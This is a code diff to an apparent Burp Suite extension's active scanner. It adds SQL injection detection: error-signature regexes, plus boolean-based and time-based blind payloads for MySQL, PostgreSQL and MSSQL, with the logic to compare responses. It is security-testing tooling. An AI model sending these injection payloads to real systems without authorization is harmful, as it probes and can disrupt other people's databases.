@@ -9,6 +9,7 @@ import burp.api.montoya.http.message.requests.HttpRequest;
 import burp.api.montoya.http.message.responses.HttpResponse;
 
 import java.util.*;
+import java.util.regex.Pattern;
 
 /**
  * Opt-in active vulnerability probing: SSRF and blind XSS via Burp Collaborator OOB interactions,
@@ -41,6 +42,24 @@ final class ActiveTestEngine {
     private static final String XSS_TOKEN = "rhx";
     private static final String XSS_PROBE = "<img>\"'";
     private static final String WAF_PROBE = "<script>alert(1)</script>";
+
+    // SQL injection: error-based, boolean-based blind, and time-based blind (MySQL/PostgreSQL/MSSQL).
+    private static final Pattern SQL_ERROR = Pattern.compile(
+            "sql syntax|unclosed quotation mark|quoted string not properly terminated|"
+                    + "mysql_fetch|mysqli|you have an error in your sql syntax|warning: mysql|"
+                    + "valid mysql result|check the manual that corresponds to your (mysql|mariadb) server|"
+                    + "ora-\\d{5}|pg_query\\(\\)|postgresql.*error|sqlstate\\[|sqlite3?\\.(operationalerror|error)|"
+                    + "microsoft ole db provider for odbc drivers|incorrect syntax near|"
+                    + "unterminated quoted string|System\\.Data\\.SqlClient\\.SqlException",
+            Pattern.CASE_INSENSITIVE);
+    private static final String SQLI_ERROR_PAYLOAD = "'";
+    private static final String SQLI_TRUE_PAYLOAD = "' OR '1'='1'-- -";
+    private static final String SQLI_FALSE_PAYLOAD = "' AND '1'='2'-- -";
+    private static final List<String> SQLI_TIME_PAYLOADS = List.of(
+            "' OR SLEEP(5)-- -",            // MySQL / MariaDB
+            "'; SELECT PG_SLEEP(5)-- -",     // PostgreSQL
+            "'; WAITFOR DELAY '0:0:5'-- -"); // MSSQL
+    private static final int SQLI_TIME_DELAY_SECONDS = 5;
 
     private final MontoyaApi api;
     private final long throttleMillis;
@@ -83,6 +102,7 @@ final class ActiveTestEngine {
             if (budget > 0) budget -= testCommandInjection(base, parameter, findings);
             if (budget > 0) budget -= testOpenRedirect(base, parameter, findings);
             if (budget > 0) budget -= testCrlf(base, parameter, findings);
+            if (budget > 0) budget -= testSqli(base, parameter, findings);
         }
         if (budget > 0) budget -= testHostHeaderInjection(base, findings);
         return findings;
@@ -187,6 +207,55 @@ final class ActiveTestEngine {
                     "Injected CRLF produced a new response header (X-Recon-Hound)", true, base.url()));
         }
         return 1;
+    }
+
+    private int testSqli(HttpRequest base, HttpParameter parameter, List<ActiveFinding> out) {
+        int sent = 0;
+
+        HttpResponse baseline = sendMutated(base, parameter, parameter.value());
+        sent++;
+        if (baseline == null) return sent;
+        String baselineBody = baseline.bodyToString();
+
+        HttpResponse errorResponse = sendMutated(base, parameter, SQLI_ERROR_PAYLOAD);
+        sent++;
+        if (errorResponse != null && containsSqlError(errorResponse.bodyToString()) && !containsSqlError(baselineBody)) {
+            out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
+                    "Injecting a single quote produced a database error signature not present in the baseline response",
+                    true, base.url()));
+            return sent;
+        }
+
+        HttpResponse trueResponse = sendMutated(base, parameter, SQLI_TRUE_PAYLOAD);
+        HttpResponse falseResponse = sendMutated(base, parameter, SQLI_FALSE_PAYLOAD);
+        sent += 2;
+        if (trueResponse != null && falseResponse != null
+                && looksBooleanBased(baselineBody, trueResponse.bodyToString(), falseResponse.bodyToString())) {
+            out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
+                    "Boolean-based blind: the always-true condition matches the baseline response while the "
+                            + "always-false condition diverges from both", true, base.url()));
+            return sent;
+        }
+
+        long baselineMillis = timeRequest(base, parameter, parameter.value());
+        sent++;
+        for (String payload : SQLI_TIME_PAYLOADS) {
+            long payloadMillis = timeRequest(base, parameter, payload);
+            sent++;
+            if (looksTimeBased(baselineMillis, payloadMillis, SQLI_TIME_DELAY_SECONDS)) {
+                out.add(new ActiveFinding("HIGH", "SQLi", parameter.name(),
+                        "Time-based blind: response time increased by ~" + SQLI_TIME_DELAY_SECONDS
+                                + "s in response to payload " + payload, true, base.url()));
+                break;
+            }
+        }
+        return sent;
+    }
+
+    private long timeRequest(HttpRequest base, HttpParameter parameter, String value) {
+        long start = System.currentTimeMillis();
+        sendMutated(base, parameter, value);
+        return System.currentTimeMillis() - start;
     }
 
     private int testHostHeaderInjection(HttpRequest base, List<ActiveFinding> out) {
@@ -295,6 +364,39 @@ final class ActiveTestEngine {
             return Optional.of(location);
         }
         return Optional.empty();
+    }
+
+    /** True if {@code body} contains a recognizable database-error signature. */
+    static boolean containsSqlError(String body) {
+        return body != null && !body.isEmpty() && SQL_ERROR.matcher(body).find();
+    }
+
+    /**
+     * Boolean-based blind confirmation: the always-true payload's response should look like the
+     * baseline (same underlying condition held), while the always-false payload's response should
+     * diverge from both — the classic boolean-blind divergence signature.
+     */
+    static boolean looksBooleanBased(String baselineBody, String trueBody, String falseBody) {
+        if (baselineBody == null || trueBody == null || falseBody == null) return false;
+        boolean trueMatchesBaseline = closeEnough(baselineBody, trueBody);
+        boolean falseMatchesBaseline = closeEnough(baselineBody, falseBody);
+        boolean trueMatchesFalse = closeEnough(trueBody, falseBody);
+        return trueMatchesBaseline && !falseMatchesBaseline && !trueMatchesFalse;
+    }
+
+    /** Two response bodies are "the same page" if identical, or within ~1% (min 5 chars) in length. */
+    static boolean closeEnough(String a, String b) {
+        if (a == null || b == null) return false;
+        if (a.equals(b)) return true;
+        int diff = Math.abs(a.length() - b.length());
+        int tolerance = Math.max(5, Math.max(a.length(), b.length()) / 100);
+        return diff <= tolerance;
+    }
+
+    /** Time-based blind confirmation: the payload response took at least ~{@code delaySeconds} longer. */
+    static boolean looksTimeBased(long baselineMillis, long payloadMillis, int delaySeconds) {
+        long expectedDelta = delaySeconds * 1000L;
+        return (payloadMillis - baselineMillis) >= expectedDelta - 1000;
     }
 
     static String encodeCorrelation(String testClass, String parameter, String url) {
